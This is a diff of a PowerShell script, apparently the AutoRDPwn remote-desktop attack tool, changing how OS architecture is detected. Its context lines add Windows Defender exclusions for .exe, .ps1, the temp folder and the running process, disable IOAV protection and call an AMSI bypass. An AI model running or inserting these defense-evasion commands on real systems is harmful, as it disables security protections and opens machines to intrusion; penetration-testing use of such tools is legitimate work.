@@ -81,7 +81,7 @@ function Remove-Exclusions {
        'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; sleep -milliseconds 7500 }
        'X' { continue }
     default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
-    $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
+    $system = (Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture
 
 if($Language -in 'English') {
   $txt1  = "Load additional modules"
@@ -231,7 +231,7 @@ if($Language -in 'Spanish') {
 
     $Powershell = $host.version ; Write-Host ; if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
-    else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim() ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
+    else { $system = (Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
     Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AMSI } else { $null }}
 
